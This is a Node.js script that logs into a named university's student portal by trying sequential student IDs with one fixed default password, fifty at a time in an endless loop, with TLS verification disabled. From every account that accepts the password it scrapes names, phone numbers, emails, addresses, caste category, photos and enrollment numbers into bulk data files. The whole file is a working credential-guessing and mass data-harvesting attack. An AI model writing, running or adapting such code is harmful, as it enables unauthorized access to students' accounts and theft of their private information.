// fetchUserInfo_stream_batch.js
const fs = require("fs");
const path = require("path");
const fetchCookie = require("fetch-cookie").default;
const { CookieJar } = require("tough-cookie");
const cheerio = require("cheerio");
const https = require("https");

// URLs
const LOGIN_URL = "https://sgguerp.in";
const DASHBOARD_URL =
  "https://department.sgguerp.in/DepartmentDashboards/StudentDashboard.aspx";

// SSL ignore
process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
const httpsAgent = new https.Agent({
  rejectUnauthorized: false,
  keepAlive: true,
});

// Fixed password
const password = "123456789";

// OUTPUT folder
const outputFolder = path.join(process.cwd(), "newStudent2023");
if (!fs.existsSync(outputFolder)) fs.mkdirSync(outputFolder);

// File splitting settings
const MAX_RECORDS_PER_FILE = 75000; // split every 75k records
const BATCH_SIZE = 50; // number of parallel requests per batch

// Helper: get last processed student ID for resume
function getLastProcessedId() {
  if (!fs.existsSync(outputFolder)) return 2023000001;

  const files = fs
    .readdirSync(outputFolder)
    .filter((f) => f.endsWith(".ndjson"))
    .sort();

  if (files.length === 0) return 2023000001;

  const lastFile = files[files.length - 1];
  const filePath = path.join(outputFolder, lastFile);

  const lines = fs.readFileSync(filePath, "utf8")
    .split("\n")
    .filter(Boolean);

  // 🔁 Read from bottom and find LAST VALID JSON
  for (let i = lines.length - 1; i >= 0; i--) {
    try {
      const obj = JSON.parse(lines[i]);
      return Number(obj.username) + 1;
    } catch {
      // skip broken line
    }
  }

  return 2023000001;
}


// --------------------
// Login + fetch
// --------------------
async function loginAndFetch(studentId) {
  try {
    const username = String(studentId);

    const jar = new CookieJar();
    const fetchWithCookies = fetchCookie(fetch, jar);

    // GET login page
    const loginPage = await fetchWithCookies(LOGIN_URL, { agent: httpsAgent });
    const html = await loginPage.text();
    const $ = cheerio.load(html);

    const form = new URLSearchParams();
    form.append("__VIEWSTATE", $("#__VIEWSTATE").val() || "");
    form.append("__EVENTVALIDATION", $("#__EVENTVALIDATION").val() || "");
    form.append("__VIEWSTATEGENERATOR", $("#__VIEWSTATEGENERATOR").val() || "");
    form.append("UserName", username);
    form.append("Password", password);
    form.append("btnLogin", "Login");

    // LOGIN
    await fetchWithCookies(LOGIN_URL, {
      method: "POST",
      body: form,
      agent: httpsAgent,
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
    });

    // DASHBOARD
    const dashRes = await fetchWithCookies(DASHBOARD_URL, { agent: httpsAgent });
    const dashHtml = await dashRes.text();
    const $dash = cheerio.load(dashHtml);

    const studentIdText = $dash("#ContentPlaceHolder1_lblSPDId").text().trim();
    if (!studentIdText) return null; // invalid user

    return {
      username,
      studentInfo: {
        name: $dash("#ContentPlaceHolder1_lblFullName").text().trim(),
        studentId: Number(studentIdText),
        mobileNo: Number($dash("#ContentPlaceHolder1_lblMobileNo").text().trim()),
        email: $dash("#ContentPlaceHolder1_lblEmailId").text().trim(),
        gender: $dash("#ContentPlaceHolder1_lblGender").text().trim(),
        category: $dash("#ContentPlaceHolder1_lblCategory").text().trim(),
        address: $dash("#ContentPlaceHolder1_lblAddress").text().trim(),
        imageSrc: $dash("#ContentPlaceHolder1_img").attr("src") || "",
        collage: $dash("#ContentPlaceHolder1_lblCollegeName").text().trim(),
        enrollment: $dash("#ContentPlaceHolder1_lblEnrollmentNo").text().trim(),
      },
    };
  } catch (err) {
    return { error: true, studentId, message: err.message };
  }
}

// --------------------
// Run batch of tasks
// --------------------
async function runBatch(tasks) {
  const results = await Promise.allSettled(tasks.map((fn) => fn()));
  return results.map((res) => res.value || res.reason || null);
}

// --------------------
// Main infinite process with batching
// --------------------
async function processStudents() {
  let studentId = getLastProcessedId();
  let fileIndex = 0;
  let recordCount = 0;

  let outPath = path.join(outputFolder, `2023_${fileIndex}.ndjson`);
  let writeStream = fs.createWriteStream(outPath, { flags: "a" });

  console.log(`Starting from studentId: ${studentId}`);

  while (true) {
    const batchTasks = [];
    for (let i = 0; i < BATCH_SIZE; i++) {
      const id = studentId + i;
      batchTasks.push(() => loginAndFetch(id));
    }

    const batchResults = await runBatch(batchTasks);

    for (let res of batchResults) {
      if (!res || res.error) {
        console.log(
          `Skipping ${res?.studentId || "unknown"}:`,
          res?.message || "Invalid user"
        );
      } else {
        writeStream.write(JSON.stringify(res) + "\n");
        recordCount++;
        console.log(
          `Saved → ${res.username} (record ${recordCount} in file ${fileIndex})`
        );
      }

      // Split file if limit reached
      if (recordCount >= MAX_RECORDS_PER_FILE) {
        writeStream.end();
        fileIndex++;
        recordCount = 0;
        outPath = path.join(outputFolder, `students_${fileIndex}.ndjson`);
        writeStream = fs.createWriteStream(outPath, { flags: "a" });
        console.log(`Starting new file: ${outPath}`);
      }
    }

    studentId += BATCH_SIZE;
  }
}

// Start process
processStudents();
